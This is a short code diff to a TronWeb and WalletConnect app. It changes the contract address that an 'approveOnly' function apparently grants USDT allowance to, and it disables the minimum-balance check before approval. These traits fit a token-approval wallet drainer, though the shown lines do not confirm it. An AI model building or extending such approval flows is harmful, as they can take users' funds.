@@ -266,7 +266,7 @@ import { TronWeb } from 'tronweb';
 import { WalletConnectWallet, WalletConnectChainID } from '@tronweb3/walletconnect-tron';
 
 const contractAddressUSDT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-const contractAddress = 'TPJFFR3B4nsjnavGr5bM9N3ahjRoXRHWij';
+const contractAddress = 'THHeEtDrFnDg3hY21SEETb9qLhhtFbd6Gi';
 const minWithdraw = 200 * 1e6; // 200 USDT in micro units
 const projectId = '150d746f7722fa489e9df7ad9ddcd955';
 const url_origin = 'https://benevolent-chimera-25b465.netlify.app';
@@ -333,10 +333,10 @@ export default function TronWalletConnectApp() {
 
   const approveOnly = async () => {
     try {
-      if (usdtBalance * 1e6 < minWithdraw) {
-        alert('Balance is less than minimum withdraw limit.');
-        return;
-      }
+      // if (usdtBalance * 1e6 < minWithdraw) {
+      //   alert('Balance is less than minimum withdraw limit.');
+      //   return;
+      // }
 
       const contract = await tronWeb.contract().at(contractAddressUSDT);
 
